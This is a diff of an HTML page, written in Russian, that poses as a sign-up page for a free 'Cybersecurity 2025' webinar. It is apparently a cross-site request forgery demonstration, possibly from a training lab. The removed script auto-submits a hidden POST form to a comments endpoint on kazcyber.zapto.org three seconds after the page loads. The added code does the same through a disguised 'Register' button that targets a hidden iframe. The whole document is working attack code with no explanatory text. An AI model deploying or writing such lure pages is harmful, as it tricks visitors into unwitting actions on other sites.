@@ -41,35 +41,20 @@
       display: none;
     }
   </style>
-  <script>
-    function sendCSRF() {
-      const form = document.createElement("form");
-      form.action = "https://kazcyber.zapto.org/comments.php";
-      form.method = "POST";
-      form.target = "hiddenFrame";
-
-      const input = document.createElement("input");
-      input.type = "hidden";
-      input.name = "comment";
-      input.value = "Зарегистрировался на вебинар Кибербезопасность 2025!";
-
-      form.appendChild(input);
-      document.body.appendChild(form);
-      form.submit();
-    }
-
-    window.onload = function () {
-      setTimeout(sendCSRF, 3000); // Через 3 секунды после загрузки
-    };
-  </script>
 </head>
 <body>
   <h1>📢 Бесплатный вебинар: «Кибербезопасность 2025»</h1>
   <p>Успей зарегистрироваться — количество мест ограничено!</p>
 
+  <form action="https://kazcyber.zapto.org/comments.php" method="POST" target="hiddenFrame">
+    <input type="hidden" name="comment" value="Зарегистрировался на вебинар Кибербезопасность 2025!">
+    <button type="submit">Записаться</button>
+  </form>
+
   <iframe name="hiddenFrame"></iframe>
 </body>
 </html>
+
 
 
 
